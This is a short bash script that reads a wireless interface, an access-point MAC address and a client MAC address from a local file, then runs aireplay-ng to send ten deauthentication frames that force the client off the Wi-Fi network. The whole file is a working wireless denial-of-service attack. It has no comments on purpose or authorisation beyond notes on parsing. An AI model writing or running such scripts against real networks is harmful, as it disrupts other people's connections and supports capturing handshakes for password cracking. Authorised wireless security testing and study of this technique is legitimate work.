#!/bin/bash
 
IFS=' '     # space is set as delimiter
read -ra mac <<< "$(cat data)"   # str is read into an array as tokens separated by IFS
# echo "${mac[0]}"
aireplay-ng --deauth 10 -a ${mac[1]} -c ${mac[2]} ${mac[0]}